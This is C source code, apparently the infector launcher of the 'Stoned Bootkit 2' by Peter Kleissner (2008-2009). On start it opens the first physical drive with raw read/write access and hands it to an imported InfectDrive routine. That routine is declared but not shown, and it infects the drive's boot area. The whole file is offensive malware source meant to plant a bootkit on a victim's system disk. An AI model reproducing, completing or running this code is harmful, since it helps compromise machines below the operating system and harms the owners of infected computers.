/*                                                                              */
/*        Infector File for Stoned Bootkit 2									*/
/*                                                                              */
/*        Name: Infector File                                                   */
/*        Author: Peter Kleissner                                               */
/*        Version: 1.0                                                          */
/*        Date: Saturday, 13th December 2008                                    */
/*              Sunday, 27th December 2009                                      */
/*                                                                              */
/*        Copyright (c) 2008 Peter Kleissner                                    */
/*        All rights reserved.                                                  */
/*                                                                              */
/*        www.stoned-vienna.com													*/
/*                                                                              */

#include "windows.h"
#include "tchar.h"
#include "Error.h"


/* imports */

void InfectDrive(HANDLE PhysicalDrive);
void DisinfectDrive(HANDLE PhysicalDrive);
void OutputUserError(int Error);


/* forward declarations */

void InfectDrive(wchar_t * DriveName);
void DisinfectDrive(wchar_t * DriveName);


/* Application Entry */

int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{
    InfectDrive(L"\\\\.\\PHYSICALDRIVE0");
    return 1;
}


/* small wrapper for infecting all drives */

void InfectDrive(wchar_t * DriveName)
{
    // create a handle to the drive
    HANDLE PhysicalDrive = CreateFile(DriveName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_RANDOM_ACCESS, NULL);
    if (PhysicalDrive == INVALID_HANDLE_VALUE)
    {
        OutputUserError(UserError_DriveOpenError);
        return;
    }

    InfectDrive(PhysicalDrive);

	CloseHandle(PhysicalDrive);
}
